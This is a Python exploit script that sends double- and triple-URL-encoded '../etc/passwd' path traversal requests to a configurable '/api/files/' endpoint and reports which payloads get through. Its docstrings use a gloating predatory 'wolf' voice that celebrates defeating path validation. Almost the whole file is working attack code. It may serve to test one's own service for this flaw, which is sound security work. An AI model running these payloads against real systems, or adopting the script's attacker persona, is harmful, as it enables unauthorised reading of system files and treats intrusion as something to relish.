"""
🐺 DOUBLE ENCODED PATH TRAVERSAL EXPLOIT

*snarls with predatory glee* Your path validation can't handle double encoding!
Multiple layers of encoding will bypass your simple checks!

*bares fangs with savage satisfaction* This exploit demonstrates double-encoded
path traversal bypass techniques.
"""

import urllib.parse
import requests
from typing import List, Dict
from dataclasses import dataclass
from rich.console import Console

console = Console()

@dataclass
class DoubleEncodedPayload:
    """Double-encoded path traversal payload"""
    name: str
    payload: str
    technique: str
    description: str

class DoubleEncodedTraversalExploit:
    """
    *circles with menacing intent* Exploits double-encoded path traversal vulnerabilities
    """
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
    
    def run_exploit(self) -> List[Dict]:
        """
        *snarls with predatory glee* Execute double-encoded path traversal attacks
        """
        console.print("[bold red]🐺 DOUBLE ENCODED PATH TRAVERSAL EXPLOIT[/bold red]")
        
        payloads = self._generate_double_encoded_payloads()
        results = []
        
        for payload in payloads:
            result = self._test_payload(payload)
            results.append(result)
        
        return results
    
    def _generate_double_encoded_payloads(self) -> List[DoubleEncodedPayload]:
        """Generate double-encoded traversal payloads"""
        return [
            DoubleEncodedPayload(
                name="Double URL Encoded",
                payload=urllib.parse.quote(urllib.parse.quote("../etc/passwd")),
                technique="Double URL Encoding",
                description="Double URL-encoded path traversal"
            ),
            DoubleEncodedPayload(
                name="Triple URL Encoded",
                payload=urllib.parse.quote(urllib.parse.quote(urllib.parse.quote("../etc/passwd"))),
                technique="Triple URL Encoding",
                description="Triple URL-encoded path traversal"
            )
        ]
    
    def _test_payload(self, payload: DoubleEncodedPayload) -> Dict:
        """Test a double-encoded payload"""
        try:
            response = self.session.get(
                f"{self.base_url}/api/files/{payload.payload}",
                timeout=5
            )
            
            return {
                'payload': payload,
                'success': response.status_code == 200,
                'response_code': response.status_code,
                'description': f"{payload.description} - {'SUCCESS' if response.status_code == 200 else 'BLOCKED'}"
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'success': False,
                'response_code': 0,
                'description': f"{payload.description} - ERROR: {str(e)}"
            }
